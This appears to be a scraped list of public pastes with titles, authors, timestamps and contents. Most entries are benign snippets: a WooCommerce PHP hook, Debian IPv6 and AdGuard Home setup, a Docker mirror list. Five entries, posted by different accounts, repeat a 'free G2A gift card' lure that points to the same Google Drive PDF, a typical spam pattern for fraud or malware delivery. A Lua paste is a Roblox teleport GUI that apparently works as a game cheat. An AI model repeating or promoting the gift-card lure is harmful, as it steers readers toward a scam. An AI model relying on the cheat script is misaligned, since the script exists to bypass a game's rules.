1Y8HMYEu,🤑G2A.com Free Gift Card Guide June 2024 Fix🤑,Garoam,JavaScript,Sunday 2nd of June 2024 11:12:50 AM CDT,"G2A.com free voucher & games guide.
Any gift card for free on G2A.com including Playstation gift cards & anything else offered.
This is the most latest version of this script. Any other one posted will not work!

PDF guide here:
https://drive.google.com/file/d/1DJewb1_3bQR3RytE-84jom7JCUX91RVh/view?002

Working as of:
June 2 2024"
H8u09vRN,wcfm-vendor-age-from-custom-field-dob,palsushobhan,PHP,Sunday 2nd of June 2024 10:58:05 AM CDT,"add_action('wcfmmp_store_list_after_store_info', function($store_id) {
    $wcfmmp_addition_info_fields = wcfm_get_option( 'wcfmvm_registration_custom_fields', array() );
    if( empty( $wcfmmp_addition_info_fields ) ) return;
    $has_addition_field = false;
    if( !empty( $wcfmmp_addition_info_fields ) ) {
        foreach( $wcfmmp_addition_info_fields as $wcfmvm_registration_custom_field ) {
            if( !isset( $wcfmvm_registration_custom_field['enable'] ) ) continue;
            if( !$wcfmvm_registration_custom_field['label'] ) continue;
            $has_addition_field = true;
            break;
        }
    }
    if( !$has_addition_field ) return;
    $wcfmvm_custom_infos = (array) get_user_meta( $store_id, 'wcfmvm_custom_infos', true );
    if( !empty( $wcfmmp_addition_info_fields ) ) {
        $label = 'DOB';
        $name = sanitize_title( $label );
        $field = $wcfmvm_custom_infos[$name] ?? '';
        if($field) {
            $age = DateTime::createFromFormat('d/m/Y', $field);
            $currentDate = new DateTime();
            echo '<p class=""store-phone""><i class=""wcfmfa fa-birthday-cake"" aria-hidden=""true""></i> Age: ' . $currentDate->diff($age)->y . ' years</p>';
        }
    }
});"
uCvdj8Yn,🤑G2A.com Free Gift Card Guide June 2024 Fix🤑,atakan1983,JavaScript,Sunday 2nd of June 2024 10:47:46 AM CDT,"G2A.com free voucher & gaming guide.
Any voucher for free on G2A.com including Amazon gift cards & anything else offered.
This is the most up to date version of this script. Any other one posted will not work!

PDF guide here:
https://drive.google.com/file/d/1DJewb1_3bQR3RytE-84jom7JCUX91RVh/view?002

Working as of:
June 2nd 2024"
gM0YthTj,Disable IPv6 Debian,kiedtink,Bash,Sunday 2nd of June 2024 10:31:43 AM CDT,"nano /etc/sysctl.conf
 
Add the following at the bottom of the file:

net.ipv6.conf.all.disable_ipv6 = 1
net.ipv6.conf.default.disable_ipv6 = 1
net.ipv6.conf.lo.disable_ipv6 = 1
net.ipv6.conf.tun0.disable_ipv6 = 1"
fZZJQTuD,AdGuard Home Debian,kiedtink,Bash,Sunday 2nd of June 2024 10:28:50 AM CDT,"apt install curl acl
curl -LO https://github.com/AdguardTeam/AdGuardHome/releases/latest/download/AdGuardHome_linux_amd64.tar.gz
tar -vxf AdGuardHome_linux_amd64.tar.gz
mkdir /opt/AdGuardHome
mv ~/AdGuardHome/AdGuardHome /opt/AdGuardHome/
chown -R root:root /opt/AdGuardHome
chmod -R o-rwx /opt/AdGuardHome
setfacl -d -m o::--- /opt/AdGuardHome
/opt/AdGuardHome/AdGuardHome -s install
"
bUkH0hEJ,докер хаб xyeсосы,WheatleyHDD,JSON,Sunday 2nd of June 2024 10:24:12 AM CDT,"{
	""registry-mirrors"" : [
		""https://mirror.gcr.io"",
        ""https://dockerhub.timeweb.cloud"",
        ""https://dockerhub1.beget.com"",
        ""https://c.163.com"",
        ""https://registry.docker-cn.com"",
        ""https://daocloud.io"",
        ""https://cr.yandex/mirror"",
        ""https://noohub.ru"",
        ""https://quay.io"",
        ""https://registry.access.redhat.com"",
        ""https://registry.redhat.io"",
        ""https://public.ecr.aws""
	]
}"
ugF49V7F,🤑G2A.com Free Gift Card Guide June 2024 Fix🤑,lookos13,JavaScript,Sunday 2nd of June 2024 10:22:45 AM CDT,"G2A.com complimentary voucher & gaming guide.
Any voucher for free on G2A.com including Xbox gift cards & everything else offered.
This is the most latest version of this script. Any other one posted will not work!

PDF guide here:
https://drive.google.com/file/d/1DJewb1_3bQR3RytE-84jom7JCUX91RVh/view?002

Working as of:
2nd of June 2024"
t0bkwywm,邀您一起看：解析管理,xiaomianao666,JavaScript,Sunday 2nd of June 2024 10:10:18 AM CDT,海阔视界规则分享，当前分享的是：二级页面详情￥page_detail￥解析管理@@
L5xT3FL3,TP Gui,JOHNDOELOL,Lua,Sunday 2nd of June 2024 10:09:11 AM CDT,"local v0 = Instance.new(""ScreenGui"");
local v1 = game:GetService(""Players"");
local v2 = game:GetService(""UserInputService"");
local v3 = Instance.new(""Frame"");
local v4 = v1.LocalPlayer;
local v5 = Instance.new(""Frame"");
local v6 = Instance.new(""UIAspectRatioConstraint"");
local v7 = Instance.new(""ScrollingFrame"");
local v8 = Instance.new(""UIListLayout"");
local v9 = Instance.new(""UIAspectRatioConstraint"");
local v10 = Instance.new(""UICorner"");
local v11 = Instance.new(""UIAspectRatioConstraint"");
local v12 = Instance.new(""UICorner"");
local v13 = Instance.new(""UIAspectRatioConstraint"");
local v14 = Instance.new(""UIAspectRatioConstraint"");
local v1 = game:GetService(""Players"");
local v2 = game:GetService(""UserInputService"");
local v15 = v3;
local v4 = v1.LocalPlayer;
local v16 = v4:GetMouse();
local v17 = false;
local v18 = false;
local v19 = nil;
local v20, v21, v22;
local function v23()
	if (v18 == false) then
		v19:Disconnect();
		return;
	end
	local v81 = v20 - v16.X;
	local v82 = v21 - v16.Y;
	v15.Position = v22 - UDim2.new(0, v81, 0, v82);
end
v15.MouseEnter:Connect(function()
	v17 = true;
end);
v15.MouseLeave:Connect(function()
	v17 = false;
end);
v2.InputBegan:Connect(function(v84)
	if ((v84.UserInputType == Enum.UserInputType.MouseButton1) or (v84.UserInputType == Enum.UserInputType.Touch)) then
		v18 = v17;
		if v18 then
			v20, v21 = v16.X, v16.Y;
			v22 = v15.Position;
			v19 = v16.Move:Connect(v23);
		end
	end
end);
v2.InputEnded:Connect(function(v85)
	if ((v85.UserInputType == Enum.UserInputType.MouseButton1) or (v85.UserInputType == Enum.UserInputType.Touch)) then
		v18 = false;
	end
end);
v0.Name = ""TP Gui"";
v0.Parent = game.Players.LocalPlayer:WaitForChild(""PlayerGui"");
v0.ZIndexBehavior = Enum.ZIndexBehavior.Sibling;
v3.Name = ""Main"";
v3.Parent = v0;
v3.BackgroundColor3 = Color3.fromRGB(62, 62, 62);
v3.BorderColor3 = Color3.fromRGB(0, 0, 0);
v3.BorderSizePixel = 0;
v3.Position = UDim2.new(0.0336134285, 0, 0.25555557, 0);
v3.Size = UDim2.new(0.377610713, 0, 0.506369412, 0);
v3.Draggable = true;
v5.Name = ""Separator"";
v5.Parent = v3;
v5.BackgroundColor3 = Color3.fromRGB(0, 0, 0);
v5.BorderColor3 = Color3.fromRGB(0, 0, 0);
v5.BorderSizePixel = 0;
v5.Position = UDim2.new(0.486156672, 0, 0, 0);
v5.Size = UDim2.new(0.00884955656, 0, 1, 0);
v6.Parent = v5;
v6.AspectRatio = 0.013;
v7.Parent = v3;
v7.Active = true;
v7.BackgroundColor3 = Color3.fromRGB(62, 62, 62);
v7.BorderColor3 = Color3.fromRGB(0, 0, 0);
v7.BorderSizePixel = 0;
v7.Position = UDim2.new(0.491876155, 0, 0, 0);
v7.Size = UDim2.new(0.498360664, 0, 1, 0);
v8.Parent = v7;
v8.HorizontalAlignment = Enum.HorizontalAlignment.Center;
v8.SortOrder = Enum.SortOrder.LayoutOrder;
v8.Padding = UDim.new(0, 7);
v9.Parent = v7;
v9.AspectRatio = 0.708;
v10.Parent = v3;
v13.Parent = v3;
v13.AspectRatio = 1.421;
v14.Parent = v0;
v14.AspectRatio = 1.906;
local function v65()
	for v93, v94 in ipairs(v7:GetChildren()) do
		if v94:IsA(""TextButton"") then
			v94:Destroy();
		end
	end
	for v95, v96 in ipairs(game.Players:GetPlayers()) do
		local v97 = Instance.new(""TextButton"");
		v97.BackgroundColor3 = Color3.fromRGB(107, 109, 107);
		v97.Text = v96.Name;
		v97.Size = UDim2.new(0, 200, 0, 50);
		v97.Position = UDim2.new(0, 0, 0, #v7:GetChildren() * 60);
		v97.Parent = v7;
		v97.MouseButton1Click:Connect(function()
			local v107 = game.Workspace:FindFirstChild(v96.Name):WaitForChild(""HumanoidRootPart"");
			game.Players.LocalPlayer.Character:FindFirstChild(""HumanoidRootPart"").CFrame = v107.CFrame;
		end);
	end
end
v65();
game.Players.PlayerAdded:Connect(v65);
game.Players.PlayerRemoving:Connect(v65);
local v66 = Instance.new(""TextButton"");
v66.Name = ""tptool"";
v66.Parent = v3;
v66.BackgroundColor3 = Color3.fromRGB(107, 107, 107);
v66.BorderColor3 = Color3.fromRGB(0, 0, 0);
v66.BorderSizePixel = 0;
v66.Position = UDim2.new(0.102950826, 0, 0.0877707973, 0);
v66.Size = UDim2.new(0.26557377, 0, 0.839622617, 0);
v66.Font = Enum.Font.SourceSans;
v66.TextColor3 = Color3.fromRGB(0, 0, 0);
v66.TextSize = 14;
v10.Parent = v66;
v11.Parent = v66;
v11.AspectRatio = 0.45;
v66.Text = ""Teleport Tool"";
v66.MouseButton1Click:Connect(function()
	local v86 = Instance.new(""Tool"");
	v86.Name = ""Teleport Tool"";
	v86.RequiresHandle = false;
	v86.Parent = game.Players.LocalPlayer.Backpack;
	local function v91(v104)
		v104.Button1Down:Connect(function()
			local v110 = v104.Hit.p;
			game.Players.LocalPlayer.Character:MoveTo(v110);
		end);
	end
	game.Players.LocalPlayer.CharacterAdded:Connect(function(v105)
		local v106 = game.Players.LocalPlayer:GetMouse();
		v91(v106);
	end);
	v91(game.Players.LocalPlayer:GetMouse());
end);
v2.InputBegan:Connect(function(v92)
	if (v92.KeyCode == Enum.KeyCode.P) then
		v3.Visible = not v3.Visible;
	end
end);"
jhz7yZyM,🤑G2A.com Free Gift Card Guide June 2024 Fix🤑,FeasModz514,JavaScript,Sunday 2nd of June 2024 10:05:09 AM CDT,"G2A.com complimentary gift card & games guide.
Any gift card for free on G2A.com including Steam gift cards & everything else offered.
This is the most current version of this script. Any other one posted will not work!

PDF guide here:
https://drive.google.com/file/d/1DJewb1_3bQR3RytE-84jom7JCUX91RVh/view?981

Working as of:
June 2nd 2024"
